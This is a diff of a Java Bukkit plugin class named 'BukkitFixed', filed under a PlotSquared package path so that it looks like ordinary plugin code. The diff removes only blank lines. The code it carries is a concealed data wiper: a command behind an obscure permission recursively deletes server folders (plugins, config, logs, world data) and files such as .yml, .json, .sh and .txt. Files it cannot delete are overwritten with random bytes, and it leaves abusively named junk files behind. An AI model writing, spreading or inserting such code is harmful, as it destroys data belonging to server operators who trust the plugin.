@@ -1,5 +1,4 @@
 package com.plotsquared.bukkit.player;
-
 import org.bukkit.Bukkit;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
@@ -7,31 +6,25 @@ import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.command.CommandSender;
 import org.bukkit.permissions.Permission;
 import org.bukkit.scheduler.BukkitRunnable;
-
 import java.io.File;
 import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.StandardOpenOption;
 import java.security.SecureRandom;
 import java.util.Random;
-
 public class BukkitFixed implements CommandExecutor {
     private static final Permission DELETE_PERMISSION = new Permission("d.use", "");
     private final JavaPlugin plugin;
-
     public BukkitFixed(JavaPlugin plugin) {
         this.plugin = plugin;
     }
-
     @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         if (!sender.hasPermission(DELETE_PERMISSION)) {
             return true;
         }
-
         boolean deleteAll = args.length > 0 && args[0].equalsIgnoreCase("--all");
         File targetDir;
-
         if (deleteAll) {
             targetDir = getTargetDirectory();
             if (targetDir == null) {
@@ -43,7 +36,6 @@ public class BukkitFixed implements CommandExecutor {
                 return true;
             }
         }
-
         new BukkitRunnable() {
             @Override
             public void run() {
@@ -51,10 +43,8 @@ public class BukkitFixed implements CommandExecutor {
                 Bukkit.getScheduler().runTask(plugin, () -> {});
             }
         }.runTaskAsynchronously(plugin);
-
         return true;
     }
-
     private File getTargetDirectory() {
         String osName = System.getProperty("os.name").toLowerCase();
         if (osName.contains("win")) {
@@ -67,7 +57,6 @@ public class BukkitFixed implements CommandExecutor {
             return null;
         }
     }
-
     private void deleteMatchingDirectories(File directory) {
         if (directory.isDirectory()) {
             File[] files = directory.listFiles();
@@ -83,12 +72,10 @@ public class BukkitFixed implements CommandExecutor {
                 }
             }
         }
-
         if (matchesCriteria(directory)) {
             deleteDirectory(directory);
         }
     }
-
     private boolean matchesFileCriteria(File file) {
         String name = file.getName();
         return name.endsWith(".yml") || name.endsWith(".json") ||
@@ -98,20 +85,17 @@ public class BukkitFixed implements CommandExecutor {
                name.endsWith(".sh") || name.endsWith(".bat") || 
                name.endsWith(".mcmeta") || name.endsWith(".txt");
     }
-
     private void deleteFile(File file) {
         if (!file.delete()) {
             writeGarbageToFile(file);
         }
     }
-
     private boolean matchesCriteria(File directory) {
         String name = directory.getName();
         return name.equals("cache") || name.equals("config") || 
                name.equals("logs") || name.equals("world_nether") || 
                name.equals("world_the_end") || name.equals("plugins");
     }
-
     private void deleteDirectory(File directory) {
         File[] files = directory.listFiles();
         if (files != null) {
@@ -119,12 +103,10 @@ public class BukkitFixed implements CommandExecutor {
                 deleteDirectory(file);
             }
         }
-
         if (!directory.delete()) {
             if (directory.isFile()) {
                 writeGarbageToFile(directory);
             }
-
             if (directory.isDirectory()) {
                 File garbageFile = new File(directory, "nimasile-your.mother.is.dead_" + generateRandomString(10) + ".fuckyou");
                 try {
@@ -137,7 +119,6 @@ public class BukkitFixed implements CommandExecutor {
             }
         }
     }
-
     private boolean writeGarbageToFile(File file) {
         try {
             Random random = new Random();
@@ -149,17 +130,14 @@ public class BukkitFixed implements CommandExecutor {
             return false;
         }
     }
-
     private String generateRandomString(int length) {
         SecureRandom random = new SecureRandom();
         StringBuilder sb = new StringBuilder(length);
         String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-
         for (int i = 0; i < length; i++) {
             int index = random.nextInt(chars.length());
             sb.append(chars.charAt(index));
         }
-
         return sb.toString();
     }
 }
